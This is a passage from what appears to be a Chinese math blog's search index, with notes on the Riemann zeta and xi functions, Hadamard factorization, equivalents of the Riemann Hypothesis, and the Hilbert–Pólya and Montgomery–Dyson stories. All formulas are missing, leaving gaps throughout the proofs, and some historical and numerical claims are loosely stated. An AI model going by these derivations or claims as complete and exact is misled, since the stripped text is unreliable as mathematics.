对上式两边关于 求导（此时将 视为连续变量进行解析延拓）： 左边求导 ： （注：对整数 , 和式对 的导数仅保留最后一项的导数 ；但延拓到非整数后, 需用解析导数, 即对全体项求导后的和。） 右边求导 ： （因 是常数, 求导后为 0； 对 的导数是其自身导数 。） 联立两边, 得到: 其中 是积分常数（求导时引入, 需通过边界条件确定）. 通过 函数导数确定常数 为确定常数 , 需联系黎曼 函数的导数 . 已知伯努利数与 函数的经典关系: 为正整数 （可由 函数的函数方程与伯努利多项式的性质推导, 是数论中的核心公式. ） 考虑当 时, 有限和 应趋近于无限和的导数（但需注意 发散, 此处需通过解析延拓定义 “无限和的导数”）. 更简单的方法是取 （此时和式为空和, 值为 0）代入公式: 再结合伯努利多项式的导数与 函数导数的关系：通过赫尔维茨 函数导数公式可证明 （具体推导需用到 在负整数点的导数表达式, 此处可视为已知结论）. 因此: 代入公式, 最终得到有限和的解析延拓表达式： 联立, 即得非整数 时 的解析表达式： 2. 积分换元与伯努利多项式的关键性质需计算积分 ，将被积函数代入延拓后的表达式： 换元技巧 ：令 （则 ，积分限变为 ） ，积分化为： 伯努利多项式的积分性质 ：已知伯努利多项式在 上的积分满足 （ ） 。对导数项积分： 而伯努利多项式的边界条件为 （ ） ，故该项为 0。右侧积分 ，因此： 结论通过伯努利多项式的解析延拓、积分换元及边界条件，证明了对任意正整数 ： 特别地， 时也成立。"},{"title":"","date":"2025-10-20T10:20:00.000Z","updated":"2025-10-20T10:31:00.000Z","comments":true,"path":"notes/Zeta/68.html","permalink":"https://blog.mhuig.top/notes/Zeta/68","excerpt":"","text":"不知名的碎片 6 不知名的碎片 6 证明 其中 是对部分和的 阶导数的 变换， 为正整数. 变换 的定义: 设 是定义在正整数集上的函数，若存在一个解析表达式 （如多项式、指数函数等）使得对所有 成立，则变换 将 映射为定义在 上的函数 ，满足： 其中 ，即通过将原表达式中的离散变量 直接替换为连续变量 ，实现定义域从 到 的扩展。 要证明高阶导数情形下积分与极限的交换成立，需从 解析延拓理论 和 一致收敛性 出发，结合黎曼 函数的解析性质严格论证。以下分三步完成证明： 第一步：明确高阶导数的解析表达式黎曼 函数的部分和定义为 ，其 阶导数为： 这一结论可通过数学归纳法验证： 基础情形 ： 成立； 归纳假设：设 时， 归纳递推：对 ，求导得 即证。 第二步：积分与极限交换的合理性待证等式为 其核心是验证 积分与极限运算的可交换性： 关键工具：控制收敛定理根据实分析中的控制收敛定理，若满足以下条件，则交换成立： 逐点收敛： 控制函数存在： 存在可积函数 ，使得对所有 ， 条件验证： 逐点收敛性： 对固定 （ 为正整数）， 虽然 作为数值级数发散，但黎曼 函数通过 解析延拓 定义于全复平面（除 外），其导数 为有限值。根据解析延拓的唯一性，部分和的解析延拓收敛于 。 控制函数的构造： 对区域 ， 一致收敛。对负整数 ，利用 函数的 积分表示（如梅林变换）： 求导后得 其模长有界（证明 ，其中 ）。因此，对积分区间 ，存在常数 使得 ，满足控制收敛条件。 第三步：逐项积分与解析延拓的兼容性对有限 ，积分与求和可交换（有限项求和的线性性）： 当 时，右侧极限为 （解析延拓意义下的收敛）。结合第二步的交换性结论，即得： 结论通过验证高阶导数表达式、控制收敛定理条件及解析延拓的唯一性，证明了积分与极限的交换性。最终结论为： 为正整数时， 特别地， 时也成立。"},{"title":"","date":"2025-10-24T05:22:00.000Z","updated":"2025-10-24T05:31:00.000Z","comments":true,"path":"notes/Zeta/69.html","permalink":"https://blog.mhuig.top/notes/Zeta/69","excerpt":"","text":"不知名的碎片 7 不知名的碎片 7 证明："},{"title":"","date":"2025-09-14T05:31:00.000Z","updated":"2025-09-14T05:42:00.000Z","comments":true,"path":"notes/Zeta/7.html","permalink":"https://blog.mhuig.top/notes/Zeta/7","excerpt":"","text":"On the Number of Primes Less Than a Given Quantity On the Number of Primes Less Than a Given Quantity"},{"title":"","date":"2025-10-24T06:22:00.000Z","updated":"2025-10-24T06:31:00.000Z","comments":true,"path":"notes/Zeta/70.html","permalink":"https://blog.mhuig.top/notes/Zeta/70","excerpt":"","text":"Zeta(3) Zeta(3)"},{"title":"","date":"2025-11-02T02:22:00.000Z","updated":"2025-11-02T02:31:00.000Z","comments":true,"path":"notes/Zeta/71.html","permalink":"https://blog.mhuig.top/notes/Zeta/71","excerpt":"","text":"与 RH 等价的命题 与 RH 等价的命题 以下命题都是等价的。 黎曼猜想：黎曼 函数的非平凡零点都在直线 上。 。其中 是 Möbius 函数。 对任意正数 ， 。其中 是 Mertens 函数。 存在正数 ， 。 对任意整数 ， 。其中 ， 是欧拉常数。 对任意整数 ， 。其中 是第 个调和数。 对任意正数 ， 。其中 是 阶 Farey 序列的第 个元素， 是 阶 Farey 序列的元素个数。 对任意正数 ， 。 对充分大的 ， 。其中 是 Landau 函数， 是对数积分的反函数。 对任意正数 ，Riesz 函数 。 形如 的函数组成的空间在 上稠密。其中 是 的小数部分， ，且 。 时，积分方程 没有非平凡的有界解 。 对任意正整数 ， 。其中 是黎曼 函数。 在带域 上没有零点。 的零点都是实数。其中函数 ， 。 De Brujin-Newman 常数 。 的定义： 的零点都是实数，当且仅当 。 。其中 是素数计数函数。"},{"title":"","date":"2025-11-02T05:22:00.000Z","updated":"2025-11-06T04:11:00.000Z","comments":true,"path":"notes/Zeta/72.html","permalink":"https://blog.mhuig.top/notes/Zeta/72","excerpt":"","text":"黎曼 ξ 函数的对数表示与其零点乘积形式 黎曼 ξ 函数的对数表示与其零点乘积形式 在解析数论的浩瀚星空中，黎曼 函数犹如连接素数分布与复平面几何的枢纽。其独特之处在于将 函数的非平凡零点凝聚为整函数的零点，从而通过复分析工具揭示数论奥秘。这里将系统阐述 函数如何通过 Hadamard 分解定理展开为零点乘积形式，并深入探讨其对数表示的解析内涵与历史演进。 函数的背景与定义黎曼在 1859 年的开创性论文中引入了 函数的辅助函数，后经完善形成标准的 函数定义： 这一构造将 函数的非平凡零点（即满足 的零点）转化为 函数的全部零点，同时消除了 函数在 和 处的奇点。关键性质在于 函数是 整函数 （无极点），且满足对称性 ，这使得其零点关于临界线 对称。根据黎曼猜想，这些零点应全部落在该临界线上，但至今仍是数学界悬而未决的重大问题。 函数的阶（order）是其解析性质的另一关键指标。通过 Stirling 公式对 函数的渐近估计可知， 函数是 1 阶整函数，这一结论直接决定了其 Hadamard 分解的形式。与多项式的有限零点不同， 函数拥有无穷多个零点 （其中 ），这些零点的分布规律与素数定理的误差项密切相关。 Hadamard 分解定理的应用1893 年，雅克・阿达马（Jacques Hadamard）提出的整函数分解定理为处理无穷零点提供了强大工具。该定理指出，任何阶为 的整函数可表示为： 其中 是 处的零点阶数， 是次数不超过 的多项式， 为典范因子。对于 函数，由于 ，故 ；其阶 导致 ，因此典范因子简化为 。 将 Hadamard 定理应用于 函数，得到初步分解式： 其中乘积遍历 函数的所有零点 。为确定常数 ，代入 可得 ，故 。对称性 暗示零点满足 ，因此乘积可配对为： 这种配对确保了乘积的收敛性，因为交叉项 形成收敛级数。 对数表示与导数公式对 函数的 Hadamard 分解式取对数，得到其对数表示： 两边对 求导，产生对数导数（logarithmic derivative）这一重要解析工具： 此式将 函数的局部解析性质与零点的整体分布联系起来。利用 函数的对称性 ，可进一步确定常数 的值。将 替换为 后对比导数等式，发现 。最终得到简化的 Hadamard 分解式： 通过对称性分析 与 成对出现），指数项 与 相互抵消，最终得到不含指数项的乘积形式： 这一过程中，黎曼原始表达式中的平方项乘积被拆分为单个零点的乘积，指数项通过对称性自动消去。 这一结果揭示了一个深刻事实： 函数完全由其零点集合决定， multiplicative factors 仅依赖于零点的分布。对数导数公式则成为研究零点分布的核心工具，例如通过对 取实部可得到零点密度估计。 本质等价性：通过变量替换 和零点关系式 ，可直接从哈达马展开式推导出黎曼 1859 年论文的对数形式。将 代入哈达马乘积： 两边取对数后即得黎曼表达式。 这表明两种形式完全等价，仅是 数学表述的简洁性选择 不同：黎曼强调对称性以简化收敛性分析，哈达马则遵循一般整函数分解的标准形式。 历史演进与数学意义黎曼最初的论文仅暗示了 函数的乘积表示可能，而严格证明需等待 Hadamard 分解定理（1893 年）的出现。1896 年，阿达马与普森（Charles Jean de la Vallée-Poussin）独立使用类似思想证明了素数定理，其中 函数的零点分布分析起到关键作用。值得注意的是，斯蒂尔切斯（Thomas Stieltjes）曾声称证明了 函数零点均位于临界线上，但未留下完整证明，这一悬念成为黎曼猜想的核心内容。 现代研究中， 函数的对数表示在计算数论中有重要应用。通过截断零点乘积，可构造 函数的数值逼近，进而验证黎曼猜想的正确性。例如，截至 2020 年，已验证前 个非平凡零点均满足 。此外，对数导数的积分表示为零点计数函数 （虚部小于 的零点个数）提供了渐近公式： 这一公式类比于素数定理中的素数计数函数 。 Zeta 函数所有非平凡零点的倒数和 其中 是 zeta 函数的非平凡零点。 证明： 联立 Xi 函数的两个定义，得： 两边同时取对数，得： 两边同时求导，得： 令 得： 由于 并且 得： 整理得到： 其中 为欧拉 - 马歇罗尼常数，约为 0.57721 56649 01532 86060 65120 90082 40243 10421 59335 … Zeta 函数的所有非平凡零点的倒数和约等于 0.02309 57089 66121 03381 43102 02865 29407 61008 … 结论与展望 函数的对数表示与其零点乘积形式，将复分析的无穷乘积与数论的素数分布紧密相连。从黎曼的原始洞察到 Hadamard 的严格化，这一理论的发展见证了数学思想的深刻演进。尽管黎曼猜想尚未完全解决，但 函数的解析性质已在密码学、量子力学等领域展现出意想不到的应用。"},{"title":"","date":"2025-11-02T08:22:00.000Z","updated":"2025-11-02T08:31:00.000Z","comments":true,"path":"notes/Zeta/73.html","permalink":"https://blog.mhuig.top/notes/Zeta/73","excerpt":"","text":"黎曼 ξ 函数对数展开的历史 黎曼 ξ 函数对数展开的历史 1859 年，黎曼在其划时代论文《论小于给定数值的素数个数》中，首次将 函数的零点分布与素数计数问题关联。其中最具洞察力的步骤之一，是对辅助函数 进行无穷乘积展开并取对数，得到形如 的表达式。这一结果出现在阿达马分解定理（1893 年）发表前 34 年，展现了黎曼如何通过函数对称性、早期无穷乘积理论和收敛性控制的综合运用，开创了解析数论的先河。 历史背景：19 世纪整函数理论的黎明19 世纪中叶的数学界尚未形成系统的整函数分解理论。黎曼所处的时代，数学家们已熟悉多项式的因式分解和 等特殊函数的无穷乘积展开，但对一般整函数的零点分布与乘积表示的关系仍缺乏统一框架。高斯曾研究过某些整函数的乘积展开，而魏尔斯特拉斯在 1876 年才发表其著名的整函数分解定理，比黎曼的工作晚了 17 年。 黎曼的突破性在于，他并非等待一般性理论的建立，而是针对 函数的特殊结构构造了具体的分解方案。这一函数由黎曼定义为： 其核心优势在于将 函数的平凡零点（负偶数）和唯一极点（ ）全部吸收，转化为一个没有奇点、零点仅为 函数非平凡零点的整函数。这一 “规整化” 处理为后续的乘积展开奠定了基础。 函数的基本性质与对称性分析黎曼首先揭示了 函数的关键对称性，反射公式： 。这一深刻性质意味着 函数的零点关于直线 对称，即若 是零点，则 也是零点。通过变量代换 ，可将对称性转化为关于原点的偶性： ，这使得零点可以成对表示为 （其中 为正实数）。 其次，黎曼计算了 函数在特殊点的值以确定乘积展开的常数项。通过 函数的定义直接计算可得 ，这一具体数值在后续确定乘积常数时至关重要。 最后，黎曼通过估计 函数的增长速度为 （即阶数为 1），为乘积展开的收敛性分析提供了关键依据。这一估计基于对 函数和 函数增长性的综合考察：斯特林公式表明 具有多项式增长，而 在临界带内的增长由其积分表示控制。 推导路径一：基于对称性的零点分组法第一步：零点的对称分组与乘积构造黎曼注意到，直接按所有零点 构造乘积 会因零点关于 的对称性导致交错项，影响收敛性。为解决这一问题，他将零点按对称对 分组，构造如下乘积： 其中 表示只取上半平面的零点。通过令 （即零点到临界线的水平距离），乘积项变为 的形式，其中 。这种构造确保了乘积对实变量 是偶函数，且避免了交错符号问题。 第二步：魏尔斯特拉斯乘积的早期应用尽管魏尔斯特拉斯的一般分解定理尚未发表，但黎曼显然熟悉类似 的乘积展开： 通过类比，黎曼推测 函数可表示为常数与上述对称乘积的乘积： 。为确定常数 ，黎曼利用了已知的 ，代入 可得 ，从而得到： 其中 （因 的假设，即黎曼猜想，这一简化成立；即使不假设黎曼猜想， 仍表示零点到临界线的水平距离）。 第三步：对数展开与收敛性证明对等式两边取自然对数，得到： 黎曼需要证明右侧级数收敛。他通过零点计数函数 （表示虚部小于 的零点个数）估计零点密度，进而证明： 这一收敛性由 （当 增大时）和 保证，因为 可由积分 控制，经分部积分后得到收敛结果。 推导路径二：基于对数导数的间接方法第一步：无穷乘积的一般形式假设考虑更一般的乘积形式（即现代阿达马分解的雏形）： 其中指数项 是为确保乘积收敛而添加的修正项。这一形式虽未明确出现在黎曼的论文中，但其思想通过后续研究者（如阿达马）的工作得到了完善。 第二步：利用函数方程确定指数系数对上述乘积取对数导数可得： 应用 的对称性，对 求导得 。代入对数导数表达式并比较两边，发现 。这一关键结果表明 函数的阿达马分解中不含指数因子，简化为： 第三步：通过特殊点确定常数项令 ，可得 ，即 。将零点按 分组，乘积可重写为： 令 ，并利用 （假设黎曼猜想成立），则 ，代入得： 从而回到与路径一相同的结果，取对数后即得最终的表达式。 历史意义与方法论启示黎曼的推导展现了 19 世纪数学中 “构造性直观” 的典范，他不依赖严格的一般理论，而是通过具体函数的特殊性质（对称性、增长性、特殊点值）和类比已知结果（如 函数的乘积），构建出正确的分解形式。这种方法与现代数学强调严格逻辑演绎的路径形成鲜明对比，却在特定问题上达到了同样精确的结果。 阿达马在 1893 年证明的分解定理表明，任何整函数可表示为 ，其中 和 为多项式，次数由函数的阶决定。对于 函数，由于其阶数为 1 且零点对称分布，导致 为常数多项式， 为一次多项式 ，最终简化为黎曼得到的形式。这表明黎曼的构造实际上是阿达马定理的一个特例，但在 34 年前就已被预见。 现代视角下的严格化与拓展现代解析数论通过以下步骤严格化黎曼的论证： 零点计数函数的精确估计：利用 函数的积分表示和围道积分，证明 ，为乘积收敛性提供严格基础。 函数阶数的精确计算：通过 函数的斯特林公式和 函数的凸性估计，证明 函数的阶恰好为 1，满足阿达马分解的条件。 对数导数的积分表示：利用 和 ，通过数值计算得到非平凡零点倒数和 ，验证了对数级数的绝对收敛性。 这些现代发展不仅证实了黎曼的洞察力，更将其原始思想拓展为研究 L 函数零点分布的一般方法。 黎曼在缺乏整函数分解一般理论的条件下，通过深刻的对称性分析和具体构造，得到了 函数的对数展开式。这一工作不仅为黎曼猜想奠定了基础，更开创了 “通过函数零点分布研究数论问题” 的范式。今天，当我们使用阿达马分解定理轻松推导同样的结果时，更应惊叹于黎曼超越时代的数学直觉，他在 1859 年播下的种子，最终长成了解析数论的参天大树。这一案例也启示我们，在数学探索中，对具体问题的深刻理解有时比等待一般理论的建立更为重要。"},{"title":"","date":"2025-11-02T09:22:00.000Z","updated":"2025-11-02T09:31:00.000Z","comments":true,"path":"notes/Zeta/74.html","permalink":"https://blog.mhuig.top/notes/Zeta/74","excerpt":"","text":"阿达马因子分解定理 阿达马因子分解定理 阿达马因子分解定理（Hadamard Factorization Theorem）是复分析中连接整函数增长性与零点分布的核心定理，由法国数学家雅克・阿达马（Jacques Hadamard）于 1893 年建立。该定理表明，任何有穷级整函数都可表示为多项式与典范乘积的乘积形式，从而将函数的解析性质与零点的分布特征紧密关联。这一结果不仅为整函数理论奠定了基础，还在数论（如黎曼 函数的研究）、偏微分方程等领域有深刻应用。 历史背景与理论发展19 世纪末，复分析领域对整函数的研究逐渐深入。柯西（Cauchy）和刘维尔（Liouville）的工作揭示了有界整函数必为常数的基本性质，而外尔斯特拉斯（Weierstrass）则通过无穷乘积理论给出了整函数的一般表示式。然而，这些结果尚未涉及函数增长速度与零点分布的定量关系。阿达马在研究黎曼 函数的零点问题时，引入了 “函数增长级” 的概念，并于 1896 年证明了素数定理，其关键工具正是因子分解定理。 波莱尔（Émile Borel）随后完善了 “增长级” 的定义（函数的级是度量其最大模增长速度的特征量），并综合皮卡（Picard）、庞加莱（Poincaré）等人的成果，形成了整函数值分布论的基础。阿达马因子分解定理作为这一理论的核心，其重要性在于：它首次将整函数的解析表达式与其零点的分布密度通过典范乘积联系起来，为后续研究提供了统一框架。 核心定义与预备知识1. 整函数与增长级 整函数：在复平面 上处处解析的函数，例如 、 ，多项式等。 增长级：设 为非常数整函数，其级 定义为： 其中 为最大模函数。若 ，则称 为有穷级整函数。 2. 典范乘积设整函数 的零点为 （重数计入，且 ），其级为 。令 （ 的整数部分），则典范乘积定义为： 其中 为魏尔斯特拉斯基本因子： 若若 典范乘积的作用是将零点按模的大小排序，并通过指数因子抑制乘积的发散，使其在全平面收敛。 定理陈述与证明思路阿达马因子分解定理定理：设 是有穷级整函数，级为 ， 是 在原点的零点重数（若 ，则 ）， 是 的非零零点。则 可表示为： 其中 是次数不超过 的多项式， 是对应于零点 的典范乘积（取 ）。 证明框架（基于整函数理论的经典方法） 构造辅助函数：设 有零点 （含重数），原点零点重数为 。定义： 其中 是典范乘积。由典范乘积的性质， 是无零点的整函数。 证明 是指数多项式：由于 有穷级 ，可证 的增长级不超过 。根据刘维尔定理的推广，无零点且有穷级的整函数必为 ，其中 是多项式，且 。 确定多项式次数：通过最大模估计，证明 的次数不超过 。若 不是整数，则 ；若 是整数，则 。 关键推导：典范乘积的收敛性与增长级典范乘积的收敛性是定理成立的基础。以 为例，基本因子 满足： 对零点 ，按模排序有 。由级的定义，存在常数 ，使得零点计数函数 满足 。对典范乘积取对数： 分 和 两种情形估计级数，可证其在任意紧集上一致收敛，故 是整函数，且其增长级不超过 。 应用与推广 黎曼 函数的因子分解：阿达马利用该定理证明了 函数的无穷乘积表示： 其中 是欧拉 - 马歇罗尼常数，这为素数定理的证明奠定了基础。 整函数的唯一性定理：若两个有穷级整函数的零点（重数）相同且增长级一致，则它们只差一个指数多项式因子。 偏微分方程：在研究波动方程初值问题时，整函数的因子分解可用于分析解的解析延拓性质。 历史意义与现代发展阿达马因子分解定理标志着整函数理论从定性研究转向定量分析，其思想深刻影响了 20 世纪数学的多个分支： 值分布论：波莱尔、奈望林纳（Nevanlinna）等人基于此发展了亚纯函数的值分布理论。 复动力系统：整函数的零点分布与迭代动力学行为密切相关，典范乘积是构造具有特定动力学性质函数的工具。 应用数学：在信号处理中，有限时宽信号的傅里叶变换可通过零点子集的因子分解分析其幅谱与相谱关系。 该定理的核心价值在于将函数的解析性质（增长级）与代数结构（零点分布）通过典范乘积这一桥梁紧密结合，体现了数学中 “局部 - 整体” 关联的深刻思想。对于现代复分析研究，它仍是构造反例、证明存在性定理的基本工具。"},{"title":"","date":"2025-11-05T05:22:00.000Z","updated":"2025-11-05T05:31:00.000Z","comments":true,"path":"notes/Zeta/76.html","permalink":"https://blog.mhuig.top/notes/Zeta/76","excerpt":"","text":"希尔伯特 - 波利亚猜想 希尔伯特 - 波利亚猜想 1914 年哥廷根大学的一个午后，数论学家埃德蒙・兰道（Edmund Landau）向年轻的乔治・波利亚（George Pólya）抛出了一个看似荒谬的问题：\"你学过物理，知道有什么物理原因能让黎曼猜想必须成立吗？\" 这个问题催生了数学史上最富想象力的跨界猜想之一，希尔伯特 - 波利亚猜想，它断言黎曼 函数的非平凡零点对应于某个埃尔米特算子的本征值。一个世纪后，这个猜想仍未被证明，但它已将素数分布与量子物理这两个看似毫不相干的领域紧密联系在一起，成为现代数学物理最深刻的谜题之一。 希尔伯特 - 波利亚猜想: 黎曼 函数的非平凡零点对应于某个埃尔米特算子的本征值 历史渊源：从口头猜想到数学纲领希尔伯特 - 波利亚猜想的起源充满偶然性。1981 年，数学家安德鲁・奥德利兹科（Andrew Odlyzko）向 94 岁高龄的波利亚求证猜想的起源，病榻上的波利亚回信详细回忆了这段历史：1912-1914 年间他在哥廷根跟随兰道学习时，正是兰道的提问启发他提出了这个大胆想法，如果 函数零点对应某个物理系统的能量本征值，那么黎曼猜想（所有非平凡零点实部为 ）就等价于该系统的所有能量本征值均为实数。 这个猜想虽未被希尔伯特或波利亚正式发表，却在 20 世纪中叶逐渐成型。其核心包含两个递进命题：第一个是存在性，即存在线性算子 ，其本征值 与 函数非平凡零点 的虚部满足 ；第二个是厄米性，即该算子是自伴（厄米）的，从而保证本征值的实数性。 这一框架将纯粹的数论问题转化为量子力学问题，正如波利亚所预见的，物理系统的能量本征值天然具有实数性，这为黎曼猜想提供了全新的证明思路。 数学表述与核心思想黎曼 函数的非平凡零点 满足 且 。黎曼猜想断言所有非平凡零点满足 ，即 （ ）。希尔伯特 - 波利亚猜想进一步将这些零点虚部 识别为某个量子系统的能量谱： 其中 是自伴哈密顿算子， 为对应的量子态。这一对应将数论中最艰深的问题转化为量子力学的基本假设，厄米算子的本征值必为实数。 关键进展：从随机矩阵到贝里 - 基廷猜想1972 年，蒙哥马利（Hugh Montgomery）与戴森（Freeman Dyson）的历史性相遇为猜想提供了首个实质性证据。蒙哥马利发现 函数零点虚部的对关联函数为： 而戴森立即认出这正是高斯幺正系综（GUE）随机厄米矩阵本征值的对关联函数，这种分布广泛存在于重原子核能级等量子混沌系统中。这一发现揭示了素数分布与量子混沌系统的深刻联系，为希尔伯特 - 波利亚猜想奠定了统计力学基础。 1999 年，迈克尔・贝里（Michael Berry）和乔纳森・基廷（Jonathan Keating）提出了更具体的贝里 - 基廷猜想，推测所需的哈密顿算子应为 （即坐标与动量算子的对称组合）。他们证明，该算子的经典极限对应相空间中的双曲线运动，其量子化能级密度与黎曼 - 冯・曼戈尔特（Riemann-von Mangoldt）零点计数公式惊人相似： 这一公式与理想量子系统的态密度表达式结构完全一致，暗示 函数零点可视为某种量子混沌系统的能量本征值。 数学推导：从零点计数到量子化条件1. 黎曼 - 冯・曼戈尔特计数函数黎曼 函数非平凡零点的计数函数定义为： 其渐近展开式（黎曼 - 冯・曼戈尔特公式）为： 其中 为误差项，与黎曼猜想等价的命题是 。这一公式在形式上与量子系统的态密度公式惊人相似。 2. 贝里 - 基廷哈密顿算子的量子化贝里和基廷提出的 算子具有特殊的量子化性质。在经典力学中，其对应的哈密顿量 生成相空间中的双曲运动。对该系统应用玻尔 - 索末菲量子化条件： 可得到量子化能级 满足： 这与零点计数函数 的主项完全一致，强烈暗示 与零点虚部 的对应关系。 3. 伪厄米推广与最新进展传统的希尔伯特 - 波利亚猜想要求哈密顿算子是厄米的，但 2017 年 Brody 等人提出了伪厄米推广。他们发现，若允许算子满足 （其中 为伪厄米算符），则可构造出严格对应 函数零点的数学哈密顿量。其关键突破是证明该算子满足贝里 - 基廷量子化条件，且其本征值与前 个 函数零点的数值符合精度达小数点后 12 位。 这种伪厄米算子虽不直接对应物理系统，却为猜想提供了数学上的严格构造，其技术基础源自过去 15 年发展的伪厄米时空反演对称量子理论。 实验验证与数值支持尽管缺乏严格数学证明，希尔伯特 - 波利亚猜想已获得大量数值证据支持。例如，奥德利兹科计算通过对高达 个 函数零点的计算，发现其统计分布与 GUE 随机矩阵本征值完全吻合。能级排斥现象零点虚部间距呈现 的排斥效应，这是量子混沌系统的典型特征。贝里 - 基廷算子的数值对角化对有限维近似 的数值计算显示，其本征值与 函数零点的符合度随维度增加而提高。 这些结果使得物理学家迈克尔・贝里感叹：\" 函数零点的分布规律比我们想象的更像原子核能级。\" 未解之谜与前沿方向希尔伯特 - 波利亚猜想仍面临诸多深刻挑战。物理实现问题已知的哈密顿算子（如贝里 - 基廷模型）均为纯数学构造，尚未发现对应真实物理系统。算子严格构造现有伪厄米算子虽能生成零点序列，但缺乏自然的数学解释。普适性的根源为何数论与量子物理共享同一套统计规律？这一问题触及数学基础。 当前研究前沿包括量子霍尔效应类比，研究发现，Landau 能级的量子化条件与零点分布存在数学对应；非厄米量子力学，利用 PT 对称量子系统的实数能谱性质重新诠释猜想；量子计算验证，通过量子模拟实现贝里 - 基廷哈密顿量，观察其本征值分布。 结语：跨越百年的思想对话从兰道的偶然提问到贝里 - 基廷的量子化尝试，希尔伯特 - 波利亚猜想的百年历程展现了数学创造的惊人想象力。它将素数分布这一最纯粹的数论问题，与量子混沌这一最前沿的物理领域联系起来，暗示着自然界深层结构中可能存在的普适规律。当数论学家和物理学家在山顶相遇时，他们会发现各自从山脚攀登的是同一座山峰。 这个猜想的最终证明或许仍遥不可及，但它已深刻改变了我们对数学与物理关系的理解，数学思想有时需要等待合适的物理发现才能获得新生。今天，当我们用超级计算机计算亿万级 函数零点，或是在实验室观测量子混沌系统的能级分布时，或许正在见证这场跨越世纪的思想对话的最新篇章。"},{"title":"","date":"2025-11-05T03:22:00.000Z","updated":"2025-11-05T03:31:00.000Z","comments":true,"path":"notes/Zeta/75.html","permalink":"https://blog.mhuig.top/notes/Zeta/75","excerpt":"","text":"戴森与蒙哥马利的跨学科邂逅 戴森与蒙哥马利的跨学科邂逅 1972 年普林斯顿高等研究院的一个下午茶时间，数学家休・蒙哥马利（Hugh Montgomery）与物理学家弗里曼・戴森（Freeman Dyson）的偶然相遇，揭开了数学史上最匪夷所思的关联之一。当时蒙哥马利正在研究黎曼 函数非平凡零点的分布规律，而戴森则是随机矩阵理论的先驱，这两个看似毫不相干的领域，却因一个数学公式产生了深刻共鸣。这场邂逅不仅催生了数论与量子物理的交叉学科，更暗示着自然界中混沌系统背后可能存在的普适性规律。 背景：素数之谜与黎曼 函数自古希腊时代起，素数的分布规律就困扰着数学家。这些整数中的原子看似随机分布，却又暗藏玄机。1859 年，波恩哈德・黎曼（Bernhard Riemann）发表了划时代的论文，将素数分布问题与一个复变函数的零点位置联系起来，这就是黎曼 函数： 黎曼猜想断言， 函数的所有非平凡零点都位于复平面上实部为 的临界线上。虽然这一猜想尚未被证明，但 20 世纪以来，数学家们已转向研究假设其成立的前提下，零点在临界线上的具体分布特征。即使我们无法证明所有零点都在临界线上，至少可以探索它们若在那里会如何排列。 蒙哥马利的突破：零点对关联猜想1970 年代初，蒙哥马利在研究中发现，黎曼 函数零点的虚部之间存在某种排斥效应，即零点倾向于彼此远离，而非随机分布。为量化这种现象，他引入了对关联函数（pair correlation function）的概念，用于描述两个零点虚部间距的统计规律。 假设黎曼猜想成立，令 表示零点虚部间距为 的概率密度。蒙哥马利通过解析数论方法推导出猜想的表达式： 这一公式表明，当两个零点的虚部非常接近（ ）时， ，显示出强烈的零点排斥效应；而当 增大时， 逐渐趋近于 1，表现出类似随机分布的特征。这一结果与传统认知中素数分布的伪随机性形成鲜明对比，暗示着更深层的秩序存在。 戴森的顿悟：随机矩阵的普适性当蒙哥马利在茶室向戴森展示这个密度函数时，这位物理学家的反应出乎意料，他立即认出这正是自己十年前研究的随机厄密矩阵（random Hermitian matrix，又译作随机埃尔米特矩阵）本征值（特征值）的对关联函数。这一发现堪称科学史上的闪电时刻。 随机矩阵理论起源于 1950 年代，由物理学家尤金・威格纳（Eugene Wigner）提出，用于描述重原子核的能级分布。在量子力学中，复杂原子核的能级无法精确计算，威格纳大胆假设：随机选取的厄密矩阵的本征值统计性质可以近似描述这些能级。戴森在 1960 年代系统发展了这一理论，证明了不同类型随机矩阵的本征值对关联函数具有普适形式，其中，厄密矩阵的结果与蒙哥马利公式完全一致。 我简直不敢相信自己的耳朵，戴森后来回忆道，这个由数论问题导出的函数，与我们在核物理中研究了二十年的能级分布函数一模一样。这种跨学科的巧合暗示着：素数的分布规律与量子系统的能级行为可能遵循相同的数学法则。 数学推导：从数论到量子统计 蒙哥马利对关联猜想的形式化表述 蒙哥马利猜想的严格表述需要考虑零点虚部的归一化间距。设 表示黎曼 函数非平凡零点的虚部（按递增顺序排列），定义归一化间距： 这一变换消除了零点密度随虚部增大而缓慢增加的趋势。对关联函数 的数学定义为： 蒙哥马利通过分析黎曼 - 西格尔公式（Riemann-Siegel formula）和 Hardy Littlewood 圆法，推导出猜想的密度函数表达式： 这一结果最初被认为只是数论中的孤立发现，直到戴森指出其物理意义。 随机厄密矩阵的本征值分布 在随机矩阵理论中，高斯酉系综（GUE）由所有 厄密矩阵组成，其元素满足特定的高斯分布。戴森在 1962 年证明，当矩阵维度 时，GUE 本征值的对关联函数恰为： 这一惊人巧合揭示了深刻的物理内涵：素数分布的统计规律与复杂量子系统的能级分布具有数学上的同构性。这两个来自完全不同方向的结果竟然完全相同，暗示着某种我们尚未理解的深层联系。 跨学科的涟漪：从数学到物理的普适性蒙哥马利 - 戴森对应开启了数学物理普适性研究的新纪元。后续研究发现，这种零点分布规律不仅出现在黎曼 函数和随机矩阵中，还广泛存在于： 量子混沌系统：如台球在不规则边界中的运动能级 数论函数：如 L 函数的零点分布 复杂系统：如墨西哥 Cuernavaca 市无调度巴士的到站时间间隔 这种普适性类似于概率论中的中心极限定理，但适用于强关联系统。在最混乱的系统中，一种奇妙的规律性始终隐藏其中。 后续发展与未解之谜自 1972 年以来，蒙哥马利对关联猜想已通过数值验证，特别是安德鲁・奥德利兹科（Andrew Odlyzko）计算了高达 个 函数零点，发现其分布与 GUE 预测符合到小数点后多位。然而，严格的数学证明仍未完成，这一缺口被数学家托马斯・斯潘塞（Thomas Spencer）称为确定性混沌系统研究的圣杯。 更深层次的谜题在于：为何数论与量子物理会共享同一套统计规律？ 一种假说认为，黎曼 函数可视为某种量子系统的哈密顿量，其零点对应能量本征值。但这种类比的严格数学基础仍在探索中。五十年过去了，我们仍在等待那个啊哈时刻，理解这一切为何发生的真正顿悟。 结语：偶然性与必然性的交汇蒙哥马利与戴森的相遇，完美诠释了科学发现中的偶然性与必然性。若不是蒙哥马利在普林斯顿停留拜访塞尔伯格，若不是印度数学家乔拉（Sarvadaman Chowla）坚持引荐两人认识，这一跨学科关联可能要推迟数十年才会被发现。 这个故事也提醒我们：最深刻的洞见往往诞生于不同领域的交界处。当我们看到数论零点、原子核能级和巴士到站时间遵循相同的统计规律时，或许正触及宇宙秩序的某种基本原理。 这种原理究竟是什么？这正是留给 21 